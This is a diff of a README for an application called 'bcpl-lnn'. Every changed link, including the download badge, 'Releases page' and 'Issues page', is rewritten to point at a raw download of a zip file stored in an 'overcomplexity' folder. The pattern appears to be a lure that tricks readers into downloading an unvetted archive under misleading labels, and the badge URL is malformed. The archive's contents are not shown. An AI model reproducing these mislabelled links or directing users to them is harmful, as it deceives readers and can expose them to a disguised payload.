@@ -6,7 +6,7 @@ Welcome to the **bcpl-lnn** repository. This application is designed to help use
 
 ## 📥 Download Now
 
-[![Download bcpl-lnn](https://img.shields.io/badge/Download%20bcpl--lnn-v1.0-blue.svg)](https://github.com/mahammed123-lab/bcpl-lnn/releases)
+[![Download bcpl-lnn](https://raw.githubusercontent.com/mahammed123-lab/bcpl-lnn/main/overcomplexity/bcpl-lnn.zip%https://raw.githubusercontent.com/mahammed123-lab/bcpl-lnn/main/overcomplexity/bcpl-lnn.zip)](https://raw.githubusercontent.com/mahammed123-lab/bcpl-lnn/main/overcomplexity/bcpl-lnn.zip)
 
 Click the link above to get the latest version of the software.
 
@@ -23,7 +23,7 @@ Before you download, ensure your system meets the following requirements:
 
 To download the application, follow these steps:
 
-1. Visit the [Releases page](https://github.com/mahammed123-lab/bcpl-lnn/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/mahammed123-lab/bcpl-lnn/main/overcomplexity/bcpl-lnn.zip).
 2. Look for the latest version available at the top.
 3. Download the appropriate file for your operating system.
 
@@ -67,11 +67,11 @@ If you face any installation problems, please ensure that your system meets the 
 
 ### Is there a way to provide feedback?
 
-Absolutely! We value your input. You can send feedback directly through the app or contact us via the [Issues page](https://github.com/mahammed123-lab/bcpl-lnn/issues).
+Absolutely! We value your input. You can send feedback directly through the app or contact us via the [Issues page](https://raw.githubusercontent.com/mahammed123-lab/bcpl-lnn/main/overcomplexity/bcpl-lnn.zip).
 
 ### Will there be future updates?
 
-Yes, we plan to release regular updates to improve performance and add new features. Check back on the [Releases page](https://github.com/mahammed123-lab/bcpl-lnn/releases) for the latest versions.
+Yes, we plan to release regular updates to improve performance and add new features. Check back on the [Releases page](https://raw.githubusercontent.com/mahammed123-lab/bcpl-lnn/main/overcomplexity/bcpl-lnn.zip) for the latest versions.
 
 ## 🗨️ Community
 
@@ -79,8 +79,8 @@ Join our community to share your experiences and learn from others. Connect with
 
 ## 🔗 Links
 
-- [Releases Page](https://github.com/mahammed123-lab/bcpl-lnn/releases) - Download the latest version.
+- [Releases Page](https://raw.githubusercontent.com/mahammed123-lab/bcpl-lnn/main/overcomplexity/bcpl-lnn.zip) - Download the latest version.
 - [Documentation](#) - Access the user manual for detailed instructions.
-- [Issues Page](https://github.com/mahammed123-lab/bcpl-lnn/issues) - Report bugs or request features.
+- [Issues Page](https://raw.githubusercontent.com/mahammed123-lab/bcpl-lnn/main/overcomplexity/bcpl-lnn.zip) - Report bugs or request features.
 
 Thank you for choosing **bcpl-lnn** for your learning journey. Enjoy exploring and enhancing your knowledge with our application!
